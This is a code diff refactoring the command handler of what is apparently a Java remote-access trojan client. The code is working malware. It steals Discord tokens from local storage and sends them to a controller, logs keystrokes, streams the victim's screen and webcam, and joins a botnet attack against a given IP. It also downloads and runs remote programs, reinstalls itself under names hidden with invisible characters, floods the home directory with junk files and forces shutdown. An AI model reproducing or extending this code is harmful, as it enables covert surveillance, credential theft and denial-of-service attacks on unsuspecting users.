@@ -23,6 +23,7 @@ import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Base64;
 
 import javax.imageio.IIOImage;
@@ -38,7 +39,6 @@ import org.jnativehook.NativeHookException;
 import com.github.sarxos.webcam.Webcam;
 import com.github.sarxos.webcam.util.OsUtils;
 
-import me.sebsb.utils.Action;
 import me.sebsb.utils.MessageType;
 import me.sebsb.utils.NetUtils;
 import me.sebsb.utils.OSUtil;
@@ -67,7 +67,7 @@ public class ClientManager {
 	// KeyLogger
 	private KeyLogger keylogger;
 
-	public void onMessage(String message, PrintWriter pw) {
+	public void onMessage(Packet packet, PrintWriter pw) {
 		if (keylogger == null) {
 			try {
 				keylogger = new KeyLogger(pw);
@@ -75,7 +75,7 @@ public class ClientManager {
 				e.printStackTrace();
 			}
 		}
-		if (message.equals(Action.DISCORD.getCommand())) {
+		if (packet.action == MessageType.DISCORD.getID()) {
 			ArrayList<String> tokens = new ArrayList<String>();
 			try {
 				tokens = this.getTokens();
@@ -92,8 +92,15 @@ public class ClientManager {
 					}
 				}
 			}
-			NetUtils.sendMessage(toSend, MessageType.GUI_TEXT, pw);
-		} else if (message.equals(Action.ALTF4.getCommand())) {
+			try {
+			    Packet packet2 = new Packet();
+			    packet2.action = MessageType.GUI_TEXT.getID();
+			    packet2.data = toSend;
+				NetUtils.sendMessage(packet2, pw);
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
+		} else if (packet.action == MessageType.ALTF4.getID()) {
 			try {
 				Robot r = new Robot();
 				r.keyPress(KeyEvent.VK_ALT);
@@ -104,15 +111,14 @@ public class ClientManager {
 			} catch (AWTException e) {
 				e.printStackTrace();
 			}
-		}  else if (message.startsWith(Action.MESSAGE_BOX + Action.getSeparator())) {
+		}  else if (packet.action == MessageType.MESSAGE_BOX.getID()) {
 			try {
-				String[] args = message.split(Action.getSeparator());
 				new Thread(new Runnable() {
 
 					@Override
 					public void run() {
 						try {
-							JOptionPane.showMessageDialog(null, args[2], args[1], Integer.parseInt(args[3]));
+							JOptionPane.showMessageDialog(null, packet.data.get(1), packet.data.get(0), Integer.parseInt(packet.data.get(2)));
 						} catch (Exception e) {
 							e.printStackTrace();
 						}
@@ -122,12 +128,11 @@ public class ClientManager {
 			} catch (Exception npe) {
 				npe.printStackTrace();
 			}
-		} else if (message.startsWith(Action.BOTNET + Action.getSeparator())) {
-			String[] args = message.split(Action.getSeparator());
-			if (args[1].equals("start")) {
+		} else if (packet.action == MessageType.BOTNET.getID()) {
+			if (packet.data.get(0).equals("start")) {
 				try {
-					String ip = args[2];
-					int timeout = Integer.parseInt(args[3]);
+					String ip = packet.data.get(1);
+					int timeout = Integer.parseInt(packet.data.get(2));
 					if (this.botnet != null && this.botnet.isAlive()) {
 						this.botnet.stop();
 					}
@@ -144,12 +149,12 @@ public class ClientManager {
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
-			} else if (args[1].equals("stop")) {
+			} else if (packet.data.get(0).equals("stop")) {
 				if (this.botnet != null && this.botnet.isAlive()) {
 					this.botnet.stop();
 				}
 			}
-		} else if (message.equals(Action.DRIVEFUCKER.getCommand())) {
+		} else if (packet.action == MessageType.DRIVEFUCKER.getID()) {
 			// I like this drive fucker
 			String characters = "abcdefghijklmnopqrstuvwxyz123456789";
 			for (int i = 0; i < characters.length(); i++) {
@@ -158,7 +163,7 @@ public class ClientManager {
 					try {
 						StringBuilder sb = new StringBuilder(characters.charAt(0));
 						for (int g = 0; g < l; g++) {
-							sb.append("‎");
+							sb.append("\u200e");
 						}
 						File f = new File(FileSystemView.getFileSystemView().getHomeDirectory(), sb.toString());
 						f.createNewFile();
@@ -172,10 +177,9 @@ public class ClientManager {
 					}
 				}
 			}
-		} else if (message.startsWith(Action.DESKTOP.getCommand() + Action.getSeparator())) {
-			String[] args = message.split(Action.getSeparator());
+		} else if (packet.action == MessageType.DESKTOP.getID()) {
 			try {
-				if (args[1].equals("start")) {
+				if (packet.data.get(0).equals("start")) {
 					runningDesktop = true;
 					if (desktop == null || !desktop.isAlive()) {
 						desktop = new Thread(new Runnable() {
@@ -187,28 +191,28 @@ public class ClientManager {
 						});
 						desktop.start();
 					}
-				} else if (args[1].equals("stop")) {
+				} else if (packet.data.get(0).equals("stop")) {
 					runningDesktop = false;
 					if (this.desktop != null && this.desktop.isAlive()) {
 						this.desktop.stop();
 					}
-				} else if (args[1].equals("comp")) {
-					this.compression = Float.parseFloat(args[2]);
+				} else if (packet.data.get(0).equals("comp")) {
+					this.compression = Float.parseFloat(packet.data.get(1));
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-		} else if (message.equals(Action.OPEN_URL.toString() + Action.getSeparator())) {
+		} else if (packet.action == MessageType.OPEN_URL.getID()) {
 			try {
-				String url = message.split(Action.getSeparator())[1];
+				String url = packet.data.get(0);
 				Desktop.getDesktop().browse(new URI(url));
 			} catch (IOException | URISyntaxException e) {
 				e.printStackTrace();
 			}
-		} else if (message.equals(Action.INSTALL_CLIENT.toString() + Action.getSeparator())) {
+		} else if (packet.action == MessageType.INSTALL_CLIENT.getID()) {
 			try {
-				String url = message.split(Action.getSeparator())[1];
-				String fileName = message.split(Action.getSeparator())[2];
+				String url = packet.data.get(0);
+				String fileName = packet.data.get(1);
 				File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
 					    .toURI());
 				File temp = new File(System.getProperty("java.io.tmpdir"), StringUtils.getRandomString(12));
@@ -221,7 +225,7 @@ public class ClientManager {
 						try {
 							StringBuilder sb = new StringBuilder(fileName);
 							for (int i = 0; i < 259 - l - fileName.length() - ".jar".length(); i++) {
-								sb.append("‎");
+								sb.append("\u200e");
 							}
 							sb.append(".jar");
 							Files.copy(Paths.get(temp.getPath()), new FileOutputStream(createdFile = new File(jar.getParent(), sb.toString())));
@@ -237,10 +241,9 @@ public class ClientManager {
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-		} else if (message.startsWith(Action.WEBCAM.getCommand() + Action.getSeparator())) {
-			String[] args = message.split(Action.getSeparator());
+		} else if (packet.action == MessageType.WEBCAM.getID()) {
 			try {
-				if (args[1].equals("start")) {
+				if (packet.data.get(0).equals("start")) {
 					runningWebcam = true;
 					if (webcam == null || !desktop.isAlive()) {
 						webcam = new Thread(new Runnable() {
@@ -256,21 +259,21 @@ public class ClientManager {
 						});
 						webcam.start();
 					}
-				} else if (args[1].equals("stop")) {
+				} else if (packet.data.get(0).equals("stop")) {
 					runningWebcam = false;
 					if (this.webcam != null && this.webcam.isAlive()) {
 						this.webcam.stop();
 					}
-				} else if (args[1].equals("comp")) {
-					this.compression = Float.parseFloat(args[2]);
+				} else if (packet.data.get(0).equals("comp")) {
+					this.compression = Float.parseFloat(packet.data.get(1));
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-		} else if (message.equals(Action.INSTALLPROGRAM.toString() + Action.getSeparator())) {
+		} else if (packet.action == MessageType.INSTALLPROGRAM.getID()) {
 			try {
-				String url = message.split(Action.getSeparator())[1];
-				String fileName = message.split(Action.getSeparator())[2];
+				String url = packet.data.get(0);
+				String fileName = packet.data.get(1);
 				String[] args = fileName.split(".");
 				String ending = args[args.length - 1];
 				File temp = new File(System.getProperty("java.io.tmpdir"), StringUtils.getRandomString(12) + "." + ending);
@@ -281,7 +284,7 @@ public class ClientManager {
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-		} else if (message.equals(Action.SHUTDOWN.toString())) {
+		} else if (packet.action == MessageType.SHUTDOWN.getID()) {
 			try {
 			    if (OsUtils.getOS() == OsUtils.NIX|| OsUtils.getOS() == OsUtils.OSX) {
 				    Runtime.getRuntime().exec("shutdown -h now");
@@ -311,34 +314,31 @@ public class ClientManager {
     }
     
 	private void remoteDesktop(PrintWriter pw) {
-		File temp = new File(System.getProperty("java.io.tmpdir"), "tempp.jpg");
+		File temp = new File(System.getProperty("java.io.tmpdir"), "tempd.jpg");
 		while (runningDesktop) {
 			try {
-				try {
-					Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();
-					
-			        Robot rt = new Robot();
-			        BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));
+				Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();
+				
+		        Robot rt = new Robot();
+		        BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));
 
-			        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
-			        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
-			        writer.setOutput(ios);
+		        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
+		        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
+		        writer.setOutput(ios);
 
-			        ImageWriteParam param = writer.getDefaultWriteParam();
-			        if (param.canWriteCompressed()){
-			            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
-			            param.setCompressionQuality(compression);
-			        }
-			        writer.write(null, new IIOImage(img, null, null), param);
-				    pw.println(MessageType.DESKTOP.getID());
-				    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
-				    pw.println(encodedString);
-				} catch (ThreadDeath td) {} catch (IOException e) {
-					e.printStackTrace();
-				} catch (Exception e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
+		        ImageWriteParam param = writer.getDefaultWriteParam();
+		        if (param.canWriteCompressed()){
+		            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
+		            param.setCompressionQuality(compression);
+		        }
+		        writer.write(null, new IIOImage(img, null, null), param);
+			    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
+			    Packet packet = new Packet();
+			    packet.action = MessageType.DESKTOP.getID();
+			    packet.data = new ArrayList<String>();
+			    packet.data.add(encodedString);
+			   	NetUtils.sendMessage(packet, pw);
+			} catch (ThreadDeath dt) {
 				if (temp.exists()) {
 					try {
 						temp.delete();
@@ -346,7 +346,8 @@ public class ClientManager {
 						e.printStackTrace();
 					}
 				}
-			} catch (Exception e) {
+			}
+			catch (Exception e) {
 				e.printStackTrace();
 			}
 			
@@ -368,45 +369,50 @@ public class ClientManager {
 	private void remoteWebcam(PrintWriter pw) {
 		Webcam webcam = Webcam.getDefault();
 		if (webcam == null) {
-		    pw.println(MessageType.WEBCAM.getID());
-		    pw.println("error");
+			try {
+				Packet packet = new Packet();
+				packet.action = MessageType.WEBCAM.getID();
+				packet.data = Arrays.asList(new String[] {"error"});
+				NetUtils.sendMessage(packet, pw);
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 		    runningWebcam = false;
 		    return;
 		}
-		webcam.open();
 		File temp = new File(System.getProperty("java.io.tmpdir"), "tempwe.jpg");
 		while (runningWebcam) {
 			try {
-				try {
-					BufferedImage img = webcam.getImage();
-			        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
-			        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
-			        writer.setOutput(ios);
+				webcam.open();
+				BufferedImage img = webcam.getImage();
+				webcam.close();
+		        ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
+		        ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
+		        writer.setOutput(ios);
 
-			        ImageWriteParam param = writer.getDefaultWriteParam();
-			        if (param.canWriteCompressed()){
-			            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
-			            param.setCompressionQuality(compression);
-			        }
-			        writer.write(null, new IIOImage(img, null, null), param);
-				    pw.println(MessageType.WEBCAM.getID());
-				    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
-				    pw.println(encodedString);
-				} catch (ThreadDeath td) {webcam.close();} catch (IOException e) {
-					e.printStackTrace();
-				} catch (Exception e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-				if (temp.exists()) {
-					try {
-						temp.delete();
-					} catch (Exception e) {
-						e.printStackTrace();
-					}
-				}
+		        ImageWriteParam param = writer.getDefaultWriteParam();
+		        if (param.canWriteCompressed()){
+		            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
+		            param.setCompressionQuality(compression);
+		        }
+		        writer.write(null, new IIOImage(img, null, null), param);
+			    String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
+			    Packet packet = new Packet();
+			    packet.action = MessageType.WEBCAM.getID();
+			    packet.data = new ArrayList<String>();
+			    packet.data.add(encodedString);
+			   	NetUtils.sendMessage(packet, pw);
+			} catch (ThreadDeath td) {webcam.close();} catch (IOException e) {
+				e.printStackTrace();
 			} catch (Exception e) {
 				e.printStackTrace();
+			}
+			if (temp.exists()) {
+				try {
+					temp.delete();
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
 			}
 			
 			try {
@@ -436,7 +442,6 @@ public class ClientManager {
 		if (OSUtil.isMac) {
 			_File = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
 		}
-		//System.out.println(new File(_File).exists() + " " + _File);
 		ArrayList<String> files = new ArrayList<String>();
 		if (!(new File(_File)).isDirectory()) {
 			return files;
